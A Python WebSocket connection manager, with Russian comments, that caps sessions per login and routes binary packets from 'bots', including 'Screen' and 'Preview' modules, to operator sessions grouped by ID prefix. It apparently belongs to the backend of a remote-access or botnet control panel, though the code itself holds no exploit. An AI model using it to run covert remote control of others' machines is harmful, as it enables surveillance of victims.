# backend/API/connection_manager.py

import asyncio
from typing import Any, Dict, List, Set, Optional

import backend.LoggerWrapper as logger


class ConnectionManager:
    """
    Управление WebSocket-туннелями и маршрутизацией пакетов между ботами и пользователями.
    
    Схема маршрутизации:
    [Bot Packet] -> [Prefix Extraction] -> [Tunnels Lookup] -> [WebSocket Queue]
    """

    def __init__(self) -> None:
        """Инициализация хранилищ активных соединений и очередей отправки."""
        self.active_users: Dict[str, List[Any]] = {}
        self.tunnels: Dict[str, List[Any]] = {}
        self.queues: Dict[Any, asyncio.Queue] = {}
        self.send_tasks: Dict[Any, asyncio.Task] = {}

    async def connect(self, websocket: Any, login: str, user_data: Dict[str, Any]) -> bool:
        """
        Регистрация нового соединения с проверкой лимита сессий.
        
        Ограничение: не более 3 одновременных сессий на один логин.
        """
        await websocket.accept()
        
        current_sessions: List[Any] = self.active_users.get(login, [])
        if len(current_sessions) >= 3:
            await websocket.close(code=1008)
            return False

        outgoing_queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        self.queues[websocket] = outgoing_queue
        self.send_tasks[websocket] = asyncio.create_task(self._writer(websocket, outgoing_queue))
        
        self.active_users.setdefault(login, []).append(websocket)
        
        user_prefix: str = user_data.get("prefix", "NONE")
        user_role: str = user_data.get("role", "user")
        
        groups: List[str] = [user_prefix, "ALL"] if user_role == "admin" else [user_prefix]
        for group in groups:
            self.tunnels.setdefault(group, []).append(websocket)

        logger.Log.info(f"[{self.__class__.__name__}] [+] {login} connected to {user_prefix}")
        return True

    def broadcast_packet_sync(self, packet: bytes) -> None:
        """
        Маршрутизация пакета от бота к веб-клиентам на основе префиксов.
        
        Структура идентификатора: [Prefix]-[UUID].
        Троттлинг: При переполнении очереди удаляются старые пакеты Screen/Preview.
        """
        if len(packet) < 7:
            return

        id_length: int = packet[0]
        module_length: int = packet[1]
        
        bot_id: str = packet[6 : 6 + id_length].decode(errors="ignore")
        module_name_bytes: bytes = packet[6 + id_length : 6 + id_length + module_length]
        
        bot_prefix: str = bot_id.split("-")[0] if "-" in bot_id else "NONE"
        
        target_websockets: Set[Any] = set(self.tunnels.get(bot_prefix, [])) | set(self.tunnels.get("ALL", []))
        
        for websocket in target_websockets:
            if not (queue := self.queues.get(websocket)):
                continue
            
            if (b"Screen" in module_name_bytes or b"Preview" in module_name_bytes) and queue.full():
                for _ in range(10):
                    if not queue.empty():
                        queue.get_nowait()

            try:
                queue.put_nowait(packet)
            except asyncio.QueueFull:
                pass

    async def _writer(self, websocket: Any, queue: asyncio.Queue) -> None:
        """
        Фоновая задача для асинхронной отправки данных из очереди в сокет.
        """
        try:
            while True:
                packet_to_send: bytes = await queue.get()
                await websocket.send_bytes(packet_to_send)
        except Exception:
            pass

    def disconnect(self, websocket: Any, login: str) -> None:
        """
        Очистка ресурсов, связанных с WebSocket сессией.
        """
        if (task := self.send_tasks.pop(websocket, None)):
            task.cancel()
            
        self.queues.pop(websocket, None)
        
        for user_sessions in self.active_users.values():
            if websocket in user_sessions:
                user_sessions.remove(websocket)
                
        for tunnel_sessions in self.tunnels.values():
            if websocket in tunnel_sessions:
                tunnel_sessions.remove(websocket)

        logger.Log.info(f"[{self.__class__.__name__}] [-] {login} disconnected")


manager: ConnectionManager = ConnectionManager()